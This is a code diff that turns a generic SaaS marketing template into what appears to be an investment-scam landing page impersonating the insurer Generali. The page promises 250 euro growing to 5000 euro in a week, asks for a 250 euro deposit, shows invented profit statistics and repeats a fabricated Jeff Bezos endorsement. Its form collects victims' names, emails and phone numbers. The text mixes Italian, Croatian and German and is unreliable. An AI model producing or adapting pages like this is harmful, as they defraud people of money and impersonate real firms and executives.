@@ -4,155 +4,262 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Plerdy</title>
+  <title>Generali</title>
+  <link rel="icon" type="image/x-icon" href="./assets/img/logo.svg">
   <link
     rel="stylesheet"
     href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
   />
-  <link rel="stylesheet" href="./css/intlTelInput.min.css">
-  <link rel="stylesheet" href="./css/main.css">
-  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@25.3.0/build/css/intlTelInput.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/css/ion.rangeSlider.min.css"/>
+  <link rel="stylesheet" href="./main.css">
+
   <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
-  <script src="./js/intlTelInput-jquery.min.js"></script>
-  <script src="./js/main.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/js/ion.rangeSlider.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@25.3.0/build/js/intlTelInput.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+  <script src="main.js"></script>
 </head>
 <body>
-<header id="header">
-  <div class="inner">
-    <a href="#"><img src="./img/Logo.svg" alt="Plerdy" class="logo"></a>
+<header class="header">
+  <div class="container">
+    <a href="">
+      <img src="./assets/img/logo.svg" alt="Generali" class="logo">
+    </a>
     <nav>
       <ul>
-        <li><a href="">Pricing</a></li>
-        <li><a href="">Use Cases</a></li>
-        <li><a href="">Book a Demo</a></li>
+        <li><a href="">Informazioni</a></li>
+        <li><a href="">CEO</a></li>
+        <li><a href="">Iniziare a guadagnare subito</a></li>
       </ul>
-      <div class="mobile">
-        <a href="#" class="btn secondary">Sing In</a>
-        <a class="btn modal-btn">Contact sales</a>
-      </div>
     </nav>
-    <div class="desktop">
-      <a href="#" class="btn secondary">Sing In</a>
-      <a class="btn modal-btn">Contact sales</a>
+    <div class="menu-btn">
+      <span></span>
     </div>
-    <div class="menu-btn"><span></span></div>
   </div>
 </header>
+
 <main>
   <section class="land">
-    <div class="inner">
-      <div class="left">
-        <h1>How to do a Website Audit to Improve SEO & Conversions</h1>
-        <p>Usability auditing with the Plerdy tool is a comprehensive expert assessment of your website based on a profound study of user behavior registered on it. Plerdy will provide you with crucial data based on which you will be able to run an efficient usability audit of your website, identify
-          and fix SEO issues, and subsequently lead it to higher positions in search.</p>
-        <sub>Thus, you'll compile a list of flaws in your website interface, navigation, and conversion path that can eventually affect its micro and macro conversion rates.</sub>
-        <a class="btn modal-btn">Run the Plerdy tool</a>
-        <footer>
-          <p>Trusted by some of the world's largest enterprises</p>
-          <div class="partners">
-            <img src="./img/softserve.svg" alt="softserve">
-            <img src="./img/subaru.svg" alt="subaru">
-            <img src="./img/anex.svg" alt="anex tour">
-            <img src="./img/prom.svg" alt="prom">
-            <img src="./img/ukrposhta.svg" alt="ukrposhta">
-          </div>
-        </footer>
-      </div>
-      <div class="right flex">
-        <div class="img">
-          <img src="./img/land-bg.png" alt="">
+    <div class="container">
+      <div class="flex m-column">
+        <div class="heading">
+          <h1>Investire 250 euro per raggiungere 5000 euro in una settimana vi sembra impossibile?
+            Con il Gruppo Generali potete fare ancora di più!</h1>
+        </div>
+        <div class="ban-1">
+          <img src="./assets/img/banner1.jpg" alt="">
+        </div>
+        <div class="form">
+          <form action="" id="top-form">
+            <input type="text" name="name" placeholder="il suo nome">
+            <input type="text" name="cog" placeholder="il suo cog">
+            <input type="text" name="email" placeholder="e-mail">
+            <input type="tel" placeholder="" id="phone">
+            <button type="submit">registrati</button>
+          </form>
         </div>
       </div>
     </div>
   </section>
-  <section class="slider">
-    <div class="inner">
-      <h2>
-        <mark>6 Reasons</mark>
-        to Use Plerdy Data for a Website Usability Audit
-        <div class="swiper-controls">
-          <div class="swiper-button-prev"></div>
-          <div class="swiper-button-next"></div>
+  
+  <section class="ben">
+    <div class="container">
+      <div class="flex d-align-center">
+        <div class="ben">
+          <img src="./assets/img/banner2.png" alt="">
         </div>
-      </h2>
-      <div class="swiper">
-        <div class="swiper-wrapper">
-          <div class="swiper-slide">
-            <h3>You will benefit from our SaaS marketing product</h3>
-            <p>
-              Our team has developed a powerful tool to audit website content – a heatmap that features more than 100 reports for e-marketers and business owners.
-            </p>
-            <div class="num">1</div>
-          </div>
-          <div class="swiper-slide">
-            <h3>We have 10+ years of experience in digital marketing</h3>
-            <p>The Plerdy team has rich experience in auditing, analyzing, and improving eCommerce websites to boost their conversion rates. So we are well aware of all the weak spots of eCommerce websites and know what data you need to run a usability audit of your website.</p>
-            <div class="num">2</div>
-          </div>
-          <div class="swiper-slide">
-            <h3>We enable generating hypotheses about what leads to low website conversions</h3>
-            <p>Thanks to the data gathered with the Plerdy heatmap about your website visitors’ behavior, you can generate hypotheses that potentially explain which functional flaws and problems are causing a low conversion on your website and how.</p>
-            <div class="num">3</div>
-          </div>
-          <div class="swiper-slide">
-            <h3>The analysis of the dynamic elements of the website</h3>
-            <p>Some services disregard such an important aspect as the clickability analysis of the dynamic elements when UX auditing, including drop-down menu, pop-up, and slider. However, thanks to the unique Plerdy auditing functionality, you will receive this information.</p>
-            <div class="num">4</div>
-          </div>
-          <div class="swiper-slide">
-            <h3>The analysis of the dynamic elements of the website</h3>
-            <p>Some services disregard such an important aspect as the clickability analysis of the dynamic elements when UX auditing, including drop-down menu, pop-up, and slider. However, thanks to the unique Plerdy auditing functionality, you will receive this information.</p>
-            <div class="num">5</div>
-          </div>
+        <div class="desc">
+          <h4>IL NOSTRO SCOPO</h4>
+          <p>Siamo qui per promuovere lo sviluppo e la circolazione delle persone, delle imprese e del Paese.</p>
         </div>
       </div>
-      <footer>
-        <a href="" class="btn">
-          Boost my website conversion
-        </a>
-        <p>So, it’s high time for you to stop losing 99% of potential clients due to being unaware of your website users’ behavior patterns and needs.</p>
-      </footer>
     </div>
   </section>
-  <div class="modal">
-    <div class="inner">
-      <div class="close"></div>
-      <div class="left">
-        <img src="./img/pexels-pixabay-264985%201.jpg" alt="">
-      </div>
-      <div class="right">
-        <h3>How to do a Website Audit to Improve SEO & Conversions</h3>
-        <p>You will get an SMS with a link to the webinar</p>
-        <form>
-          <fieldset>
-            <label>Name</label>
-            <input type="text" placeholder="Boris Johnson" name="name">
-          </fieldset>
-          <fieldset>
-            <label>Lable</label>
-            <input type="tel" placeholder="" id="phone" name="phone">
-          </fieldset>
-          <div class="flex">
-            <button disabled type="submit">Support</button>
-            <a href="" class="btn">Contact sales</a>
+  
+  <section class="service">
+    <div class="container">
+      <h3>Inizia a servire con noi</h3>
+      <div class="list">
+        <div class="item">
+          <div class="icon">
+            <img src="./assets/img/f7_doc-person.svg" alt="">
           </div>
-        </form>
-        <div class="policy">
-          <label class="checkbox">
-            <input type="checkbox">
-            <span class="mark"></span>
-          </label>
+          <h4>Registrazione</h4>
           <p>
-            By sending up? you agree to our <a>Conditions</a> and <a>Privacy Policy</a>
+            Compilare tutti i campi del modulo di registrazione sul sito web.
           </p>
+          <div class="btn init">INIZIARE</div>
         </div>
-        <div class="bot">
-          <img src="./img/logo-min.svg" alt="">
-          <span>Powered by <a href="">Plerdy</a></span>
+        <div class="item">
+          <div class="icon">
+            <img src="./assets/img/ph_detective-fill.svg" alt="">
+          </div>
+          <h4>Consultazione di esperti</h4>
+          <p>
+            Dopo la registrazione, rispondere all'invito del Consulente di supporto di Petrol Energia e seguire tutte le sue istruzioni.
+          </p>
+          <div class="btn init">INIZIARE</div>
         </div>
+        <div class="item">
+          <div class="icon">
+            <img src="./assets/img/ph_tree-light.svg" alt="">
+          </div>
+          <h4>Deposito</h4>
+          <p>
+            Dopo la verifica, è necessario depositare un minimo di 250 euro sul conto dell'azionista.
+          </p>
+          <div class="btn init">INIZIARE</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  
+  <section class="range">
+    <div class="container">
+      <div class="flex m-column">
+        <div class="image">
+          <img src="./assets/img/image%202.jpg" alt="">
+        </div>
+        <div class="text">
+          Philippe Donnet, amministratore delegato di Generali, ha appena festeggiato dieci anni in Italia e in un’intervista a “Repubblica” spiega che bilancio trae dal nostro Paese: “In questi dieci anni il mondo ha dovuto fare i conti con prove molto dure e questo ci ha resi più capaci di gestire
+          l’imprevedibile. L’Italia ha resistito bene. Per quanto mi riguarda, tre anni fa sono diventato cittadino italiano: perché ci tenevo a rimarcare un’adesione forte ai valori e alla cultura di questo Paese”. Un’altra prova per l’economia è stato il repentino rialzo dei tassi: “A mio parere è
+          improprio parlare oggi di tassi alti: quando ero teenager, i mutui viaggiavano a due cifre percentuali. La vera anomalia è stata vivere con tassi a zero per quindici anni. Oggi siamo in una situazione normale. Per quel che riguarda il nostro gruppo, abbiamo un business mix grazie al quale
+          possiamo crescere in qualsiasi ciclo economico”. La crescita dell’Italia è stimata attorno allo 0,7 per cento: “Noi non avremo problemi ma per la crescita si può fare meglio, in Italia e in Europa. Ritengo che in Europa non ci sia abbastanza Europa, ma troppe tasse e troppe norme, che si
+          sovrappongono a quelle nazionali. Questo non aiuta né le famiglie né le imprese: quindi abbassiamo le tasse, riduciamo le norme e liberiamo le energie imprenditoriali”.
+        </div>
+      </div>
+      <h3>Potencijal dobiti</h3>
+      <div class="flex m-column">
+        <div class="range">
+          <div class="inputs">
+            <input type="text" id="period" name="example_name" value="" />
+            <input type="text" id="sum" name="example_name" value="" />
+          </div>
+          <div class="btn range-btn">
+            MOGUĆA DOBIT:&nbsp;
+            <span>
+              € 8600
+            </span>
+          </div>
+        </div>
+        <div class="desc">
+          <h5>UKUPNA DOBIT KORISNIKA:</h5>
+          <p>€ 128 567 000</p>
+          <h5>AKTIVNI KORISNICI:</h5>
+          <p>77 335</p>
+        </div>
+      
+      </div>
+    </div>
+  </section>
+  
+  <section class="slide">
+    <div class="container">
+      <div class="swiper">
+       <div class="swiper-wrapper">
+         <div class="swiper-slide item">
+           <header>
+             <div class="flex gap-md">
+               <div class="img">
+                 <img src="assets/img/slide-ava.png" alt="Jeff Bezos">
+               </div>
+               <div class="title">
+                 <h3>Jeff Bezos:</h3>
+                 <p>Technologieunternehmer, Investor und Philanthrop</p>
+                 <a href=""><img src="./assets/img/logos_facebook.svg" alt=""></a>
+               </div>
+             </div>
+           </header>
+           <div class="desc">
+             Dem Quantencomputing gehört die Zukunft. Ich übertreibe nicht, wenn ich sage, es wird
+             alles verändern wird. Das Quantencomputing steht noch ganz am Anfang; nicht viele
+             Menschen wissen davon, was bedeutet, dass nur sehr wenige es nutzen. Die wenigen, die
+             es nutzen, treffen unglaublich kluge (und profitable) Entscheidungen.
+           </div>
+         </div>
+         <div class="swiper-slide item">
+           <header>
+             <div class="flex gap-md">
+               <div class="img">
+                 <img src="assets/img/slide-ava.png" alt="Jeff Bezos">
+               </div>
+               <div class="title">
+                 <h3>Jeff Bezos:</h3>
+                 <p>Technologieunternehmer, Investor und Philanthrop</p>
+                 <a href=""><img src="./assets/img/logos_facebook.svg" alt=""></a>
+               </div>
+             </div>
+           </header>
+           <div class="desc">
+             Dem Quantencomputing gehört die Zukunft. Ich übertreibe nicht, wenn ich sage, es wird
+             alles verändern wird. Das Quantencomputing steht noch ganz am Anfang; nicht viele
+             Menschen wissen davon, was bedeutet, dass nur sehr wenige es nutzen. Die wenigen, die
+             es nutzen, treffen unglaublich kluge (und profitable) Entscheidungen.
+           </div>
+         </div>
+         <div class="swiper-slide item">
+           <header>
+             <div class="flex gap-md">
+               <div class="img">
+                 <img src="assets/img/slide-ava.png" alt="Jeff Bezos">
+               </div>
+               <div class="title">
+                 <h3>Jeff Bezos:</h3>
+                 <p>Technologieunternehmer, Investor und Philanthrop</p>
+                 <a href=""><img src="./assets/img/logos_facebook.svg" alt=""></a>
+               </div>
+             </div>
+           </header>
+           <div class="desc">
+             Dem Quantencomputing gehört die Zukunft. Ich übertreibe nicht, wenn ich sage, es wird
+             alles verändern wird. Das Quantencomputing steht noch ganz am Anfang; nicht viele
+             Menschen wissen davon, was bedeutet, dass nur sehr wenige es nutzen. Die wenigen, die
+             es nutzen, treffen unglaublich kluge (und profitable) Entscheidungen.
+           </div>
+         </div>
+       </div>
+      </div>
+    </div>
+  </section>
+  
+  <section class="partners">
+    <div class="container">
+      <h3>Gli azionisti dell'azienda</h3>
+      <div class="list">
+        <img src="./assets/img/parts/medio.png" alt="">
+        <img src="./assets/img/parts/uni.png" alt="">
+        <img src="./assets/img/parts/banca.png" alt="">
+        <img src="./assets/img/parts/bd.png" alt="">
+        <img src="./assets/img/parts/carl.png" alt="">
+        <img src="./assets/img/parts/gen.png" alt="">
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <div class="flex m-column-reverse">
+      <div>
+        <a href=""><img src="./assets/img/logo.svg" alt=""></a>
+      </div>
+      <div>
+        <ul>
+          <li><a href="">Mappa del sito</a></li>
+          <li><a href="">Termini di utilizzo</a></li>
+          <li><a href="">Avviso di accessibilità</a></li>
+          <li><a href="">Gestione dei Cookie</a></li>
+          <li><a href="">Politica sulla protezione dei dati e informativa sulla privacy</a></li>
+        </ul>
+        <ul>
+          <li><a href="">Avviso di frode Web e phishing</a></li>
+          <li><a href="">Politica sui reclami – Australia</a></li>
+        </ul>
       </div>
     </div>
   </div>
-</main>
+</footer>
 </body>
 </html>
